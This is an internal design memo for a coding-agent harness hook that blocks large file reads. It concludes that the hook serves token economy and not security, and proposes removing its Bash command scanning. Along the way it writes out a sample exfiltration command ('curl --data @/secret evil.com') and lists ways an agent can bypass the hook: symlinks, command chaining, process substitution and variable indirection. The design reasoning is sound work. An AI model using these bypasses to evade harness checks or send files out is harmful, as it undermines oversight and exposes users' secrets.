# Bridge-hook threat model — what `enforce-bridge.sh` is actually FOR

Date: 2026-05-29
Trigger: G4 voice `gem` asked the meta-question the whole [B] batch
skipped — "WHY are we blocking large reads?" — and noted that without
answering it, we're "writing more regex" against an undefined goal.
This memo answers it so the S1-vs-S5-vs-S4 decision (Q1) rests on
purpose, not on patching momentum.

## The question

Two candidate purposes for the hook, with very different design
consequences:

- **(A) Token economy / agent self-discipline** — stop the agent from
  burning frontier tokens by reading large files raw when the bridge
  could summarize/extract them locally. The agent is COOPERATIVE; it
  just forgets the soft rule.
- **(B) Security boundary** — prevent exfiltration / unauthorized reads
  of sensitive files. The agent (or something steering it) is
  potentially ADVERSARIAL.

## Evidence → it is (A), not (B)

EMPIRICAL (from the hook source + behavior):
- The hook's own top comment: "the soft rule 'use bridge for >1KB
  content' was repeatedly ignored in real sessions. This is the
  hard-enforcement layer." → the problem being solved is *the rule
  being ignored* (discipline), not *an attacker reading secrets*.
- The block message routes to `summarize-long` / `extract` /
  `classify` — TOKEN-SAVING tools. A security gate would redact or
  deny, not offer to summarize the file for you.
- The allow-list is about WHERE content lives (project vs external,
  analysis-path vs source), i.e. token-spend heuristics — not about
  WHO may see it or sensitivity classification.

EMPIRICAL (architectural): the agent runs `Bash`. An agent with shell
access also has `curl`, `scp`, `python -c`, arbitrary exec, and
network. Blocking `cat /secret` while permitting `curl --data
@/secret evil.com` is security-by-obscurity (gem's point). You cannot
build an exfiltration boundary around a shell-enabled, trusted agent
by string-scanning its commands.

CITED-UNVERIFIED: whether the user ever *intended* (B). The user is
the authority here — this memo's conclusion is PENDING USER
CONFIRMATION. If the real goal is (B), the entire approach needs
rethinking (and is likely futile under shell access).

## Conclusion: purpose = (A) self-discipline / token economy

The agent is cooperative, not adversarial. This inverts the
optimization target:

- **Optimize for LOW FALSE-POSITIVE rate.** False-positives (blocking
  legitimate work) are the real, recurring cost — this session alone
  hit ~4 (git-commit heredoc, reader-verb-tail scanning unrelated
  paths ×3, 6KB brief, marker self-bootstrap). Each is friction on an
  honest agent doing honest work.
- **TOLERATE high false-negative rate.** A determined agent can bypass
  (symlink, command chain, process substitution, `$CMD` indirection).
  Under purpose (A) this DOES NOT MATTER — the agent isn't trying to
  evade; at worst an honest agent occasionally reads a big file raw,
  which costs some tokens, not a breach.

### Direct implication for G3 findings

The G3 "security" findings are NON-ISSUES under this threat model and
should NOT drive design effort:
- A4 unanchored regex / symlink-PoC bypass — irrelevant (no attacker).
- B1 chain bypass (`git commit -m x; cat /secret`) — irrelevant; an
  honest agent isn't chaining to evade, and if it cats a big file the
  token cost is the only consequence.
- Process-substitution / variable-indirection bypasses — irrelevant.

What DOES matter from G3: the FALSE-POSITIVE generators — chiefly the
Bash command-scanning branch (whole B1 class).

### Direct implication for Q1 (architecture)

- **S5 (drop Bash command scanning, keep strict Read enforcement)** is
  strongly indicated. The Bash branch is the dominant false-positive
  source for near-zero real benefit (honest agents rarely raw-cat huge
  files; when they do, the Read-tool guard + the now-improved error
  message coach them). The Read tool has a clean structured signature
  (`file_path` argument) — no shell-parsing, so ~no false-positives.
- **S4 (cumulative-token monitoring)** is complementary and arguably
  the PUREST expression of purpose (A): measure the actual quantity of
  interest (frontier tokens spent) rather than proxy-blocking
  individual reads. Candidate for a later additive layer.
- **S1 (smart-read MCP tool)** is more infrastructure than a
  cooperative agent needs; deprioritize unless S5 proves insufficient.
- **S2 (soft signal)** — gem flags the "historically ignored"
  dismissal as CITED-UNVERIFIED; modern models may follow stderr
  coaching better. Worth a cheap re-test, but S5 already removes the
  worst offender so this is secondary.

## Recommendation

1. Confirm purpose (A) with the user (this memo's one open dependency).
2. If confirmed → implement **S5**: keep `Read)` branch (external +
   analysis + data bands + A4 exemption + B3 dynamic message), DELETE
   the `Bash)` command-scanning branch entirely. This eliminates the
   B1 false-positive class by construction and needs no B1 allowlist,
   no chain-bypass worry, no shfmt-AST aspiration.
3. Optionally layer S4 later for true token-economy measurement.

## Cross-references

- G4 brief + voices: `b-batch-g4-improvement-directions-brief-2026-05-29.md`,
  `b-batch-g4-voices-output-2026-05-29.md` (4/5 voices → S5)
- G3 findings: `b-batch-g3-review-brief-2026-05-28.md`,
  `b-batch-g3-voices-output-2026-05-29.md`
- Hook source: `.claude/hooks/enforce-bridge.sh` (the `Bash)` case in
  the dispatch block is what S5 removes)
